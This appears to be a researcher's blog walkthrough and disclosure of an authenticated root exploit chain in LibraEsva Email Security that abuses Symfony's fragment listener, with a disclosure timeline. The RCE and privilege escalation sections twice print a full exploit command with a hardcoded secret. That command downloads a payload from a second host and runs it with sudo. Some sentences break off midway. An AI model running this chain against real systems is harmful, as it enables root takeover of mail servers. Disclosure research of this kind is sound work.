---
title: LibraEsva's Email Security Authenticated root shell
excert: An underling bug in Symfony brings to an RCE in famous email security manager
tags:
 - CVE
 - LibraEsva
 - RCE
 - Shellcode
 - Web
 - Walkthrough
category:
 - research
toc: true
classes: single
---


TL;DR Based upon Symfony framework, the LibraESVA's [__FragmentListener__][1] class exposed with well-know secret permit to achive a root shell trougth a chain of autenticated RCE and privilegs escalation.

Let's dive in:

## LibraEsva

The company LibraESVA proposes different solution for managin email ecosystem. From Email Security program to Load Balacer solution.
Basicly those products are suite for managing emails, ranging from user managment to built-in security fetures like anti-virus scan and phishin prevention mechanism.

## Symfony RCE

Thanks to the [excellent work by Ambionic Security][2] on the Symfony Framework, it was possibile to focus my research on the __FragmentListener__ class.
Quoting from their blog,  
```
Essentially, when someone issues a request to /_fragment, this listener sets request attributes from given GET parameters. Since this allows to run arbitrary PHP code (more on this later), the request has to be signed using a HMAC value. This HMAC's secret cryptographic key is stored under a Symfony configuration value named secret.
```

Obviously we need to find this __secret__. Lukly this was a trivial task, as the Symphony's well documented docs gives instruction where to find this value.
Located within the __/xxx/yyy/zzz.conf__ file, t

## RCE

Using the previus mentioned technique, it was possible to remotly execute command on the machine. This was achived using the the [Ambionic's Symfony Exploit][3] found on their GitHub page.
Building the command as following:
```
./secret_fragment_exploit.py https://192.168.11.120/_fragment -i "https://192.168.11.120/_fragment" -s '36b1f1aadcc7602eeedcd83cc7d5510e9b2a9bd5' -m 1 -f shell_exec -p cmd:"cd /tmp/; wget -qO upgradescript --no-check-certificate https://192.168.11.124:8443/QE4aPZwlxtk; chmod 777 upgradescript; sudo ./upgradescript disown
``` 

## Privilage Escalation

Located in /tmp there is a script file which is either writable and suid's settable. 
The __/tmp/upgradescript__ 

The complete command to trigger the chain is:
```
./secret_fragment_exploit.py https://192.168.11.120/_fragment -i "https://192.168.11.120/_fragment" -s '36b1f1aadcc7602eeedcd83cc7d5510e9b2a9bd5' -m 1 -f shell_exec -p cmd:"cd /tmp/; wget -qO upgradescript --no-check-certificate https://192.168.11.124:8443/QE4aPZwlxtk; chmod 777 upgradescript; sudo ./upgradescript disown
```

## Final thoughts 

It is very important to run periodic vulnerability assesment and complete penetration testing on you own produtcs, which seems that LibraEsva haven't done.
Nonless they were very quick in triagin and fixing the bug.

## Disclosure Timeline
18-03-2021 LibraEsva's developers team informed about the vuln
07-04-2021 Fix released with produtc version 4.9.5
27-07-2021 Public release

---
[1]: https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
[2]: https://www.ambionics.io/blog/symfony-secret-fragment
[3]: https://github.com/ambionics/symfony-exploits



